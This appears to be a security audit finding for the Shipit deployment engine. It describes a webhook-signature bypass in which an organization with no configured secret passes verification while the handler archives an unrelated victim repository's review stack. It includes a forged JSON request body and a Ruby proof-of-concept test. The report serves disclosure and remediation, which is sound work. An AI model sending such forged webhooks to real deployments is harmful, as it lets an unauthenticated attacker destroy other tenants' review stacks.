### Title
Cross-tenant review-stack takeover via decoupled webhook-signature org and mutated-repository full_name for no-secret orgs - (File: `app/controllers/shipit/webhooks_controller.rb`, `lib/shipit/github_app.rb`)

### Summary
`Shipit::WebhooksController#verify_signature` selects the GitHub App/organization used to verify a webhook's signature from `params.dig('repository','owner','login')` [1](#0-0)  — a value taken from the same attacker-supplied JSON body that also contains the unrelated `repository.full_name` field consumed later by the `pull_request` handlers to select the mutated `Repository`/`ReviewStack` [2](#0-1) . Because `GitHubApp#verify_webhook_signature` unconditionally returns `true` when the selected organization has no configured `webhook_secret` [3](#0-2) , an attacker who names a configured-but-secret-less organization in `repository.owner.login` gets a fully-verified request while `repository.full_name` (used by the handler) points at an unrelated victim repository, letting them archive/deprovision that victim's review stack.

### Finding Description
The broken binding is: *the organization whose signature check passed* (`repository_owner` in `verify_signature`, derived from `params.repository.owner.login`) is asserted to equal *the organization/repository whose state is mutated* (`params.repository.full_name` used by `ClosedHandler#repository`). These are two independently attacker-controlled JSON fields in the same POST body, and nothing in the request pipeline enforces they refer to the same tenant.

Path traced:
1. `WebhooksController#create` parses `request.raw_post` as JSON and dispatches to `Shipit::Webhooks.for_event('pull_request')` handlers, unconditionally passing the full attacker body [4](#0-3) .
2. Before that, `before_action :verify_signature` computes `repository_owner` from `params.dig('repository','owner','login')` and resolves `Shipit.github(organization: repository_owner)` [5](#0-4) .
3. `GitHubApp#verify_webhook_signature` short-circuits to `true` when that organization's `webhook_secret` is blank, before ever inspecting the `X-Hub-Signature` header or its algorithm [3](#0-2) .
4. The dispatched `Handlers::PullRequest::ClosedHandler` independently re-parses the same body via its own `ExplicitParameters` schema and resolves the target repository from `params.repository.full_name`, completely unrelated to the `repository.owner.login` used for step 2 [6](#0-5) .
5. `ReviewStackAdapter#archive!` then deprovisions and archives the resolved victim stack using attacker-supplied `sender.login` as the acting user [7](#0-6) .

Attacker's exact request: a `POST /webhooks` with header `X-Github-Event: pull_request`, any `X-Hub-Signature` value (its content is irrelevant once step 3 short-circuits), and a JSON body such as:
```json
{
  "action": "closed",
  "number": 1,
  "pull_request": {...},
  "repository": { "owner": { "login": "no-secret-org" }, "full_name": "victim-org/victim-repo" },
  "sender": { "login": "attacker" }
}
```
provided `no-secret-org` is a GitHub org/app configured in the host's `Shipit.github_apps` without a `webhook_secret` (a supported, documented configuration per `docs/setup.md` and the secrets examples) while `victim-org/victim-repo` is a real, unrelated Shipit-managed repository with review stacks.

Existing guards fail to catch this: `drop_unhandled_event` only checks the event name exists, not payload consistency; `verify_signature` never cross-checks that the org it authenticated matches the repository referenced elsewhere in the payload; `ExplicitParameters` schemas in the handlers validate types/presence, not cross-tenant identity; there is no model-level or controller-level assertion binding the verified organization to `repository.full_name`.

The question's "sha1 vs sha256" framing is a secondary detail — `verify_webhook_signature` only ever supports `sha1` regardless of secret presence [8](#0-7) , but that alone is not a bypass when a secret is actually configured, since the attacker still cannot compute a valid HMAC without it. The real, exploitable divergence is the `return true unless webhook_secret` early-return combined with the attacker's free choice of which organization name is checked, decoupled from which repository is mutated.

### Impact Explanation
An unauthenticated attacker who knows the name of any Shipit-configured GitHub organization/app that lacks a `webhook_secret` can forge a `pull_request`/`closed` (or `opened`/`labeled`/etc., since all `PullRequest` handlers share this same `repository.full_name` vs `repository.owner.login` decoupling) webhook that archives, deprovisions, or otherwise mutates review stacks belonging to a completely different, unrelated victim repository/organization that the attacker has no access to. This is repeatable against any repository tracked by Shipit and matches "Critical — Cross-tenant/cross-repository state manipulation (one repo's payload writes another repo's records)."

### Likelihood Explanation
Exploitability is conditioned on the Shipit deployment having at least one configured GitHub org/app without a `webhook_secret` — a legitimate, documented configuration option, not a misconfiguration outside the engine's design. No GitHub secrets, sessions, or API tokens are required; the attacker needs only network access to `POST /webhooks` and knowledge of (a) a no-secret org's name and (b) a victim repository's `full_name`, both of which can be enumerated from public GitHub organization listings. This is a zero-cost, repeatable, fully automatable attack per victim repository.

### Recommendation
Bind webhook verification to the same repository/organization that handlers act upon: derive `repository_owner` for signature verification from the identical field the handlers use to resolve the target `Repository` (`repository.full_name`'s owner segment), and reject requests where these diverge. Additionally, do not treat a missing `webhook_secret` as automatic verification success — either require all configured GitHub orgs/apps to have a `webhook_secret`, or explicitly restrict unverified event handling to read-only/no-op behavior instead of allowing state-mutating handlers to run.

### Proof of Concept
```ruby
# test/controllers/webhooks_controller_test.rb (new test)
test "no-secret org name in repository.owner.login bypasses verification and archives victim repo's review stack" do
  # Precondition: Shipit.github_apps includes an org "no-secret-org" with no webhook_secret configured,
  # and shipit_repositories(:victim) is a real Repository with an active, unarchived ReviewStack for PR #1.
  victim_repo = shipit_repositories(:victim)
  review_stack = victim_repo.review_stacks.create!(environment: "pr1", branch: "feature")

  body = {
    action: "closed",
    number: 1,
    pull_request: { id: 1, number: 1, url: "https://api.github.com/...", title: "t",
                     state: "closed", additions: 0, deletions: 0,
                     head: { sha: "abc", ref: "feature" },
                     user: { login: "attacker" }, assignees: [], labels: [] },
    repository: { owner: { login: "no-secret-org" }, full_name: victim_repo.full_name },
    sender: { login: "attacker" }
  }.to_json

  @request.headers['X-Github-Event'] = 'pull_request'
  @request.headers['X-Hub-Signature'] = 'sha1=deadbeef' # arbitrary/invalid, unused for no-secret org

  post :create, body:, as: :json

  assert_response :ok
  # Equality check that should have held but doesn't:
  # verified_org("no-secret-org") == owner_of(review_stack.repository) -> false, yet mutation still occurred
  assert review_stack.reload.archived?, "victim repo's review stack was archived without ever authenticating victim-org's webhook_secret"
end
```
This demonstrates the broken binding: the organization used to pass `verify_signature` (`no-secret-org`) is not the organization/repository (`victim_repo.full_name`) whose `ReviewStack` was mutated, and the mutation succeeds anyway.

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L10-15)
```ruby
    def create
      params = JSON.parse(request.raw_post)
      Shipit::Webhooks.for_event(event).each { |handler| handler.call(params) }

      head(:ok)
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/closed_handler.rb (L49-63)
```ruby
          def repository
            @repository ||=
              Shipit::Repository.from_github_repo_name(params.repository.full_name) ||
              Shipit::NullRepository.new
          end

          def review_stack
            @review_stack ||=
              Shipit::Webhooks::Handlers::PullRequest::ReviewStackAdapter
              .new(params, scope: repository.review_stacks)
          end

          def respond_to_pull_request_closed?
            params.action == "closed"
          end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb (L23-35)
```ruby
          def archive!(*args, &block)
            if stack.blank?
              Rails.logger.info(
                "Processing #{action} event for #{repo_name} PR #{pr_number} but no Stack exists. Ignoring."
              )
              return true
            end
            return if stack.archived?

            stack.remove_from_provisioning_queue
            stack.deprovision
            stack.archive!(user, *args, &block)
          end
```
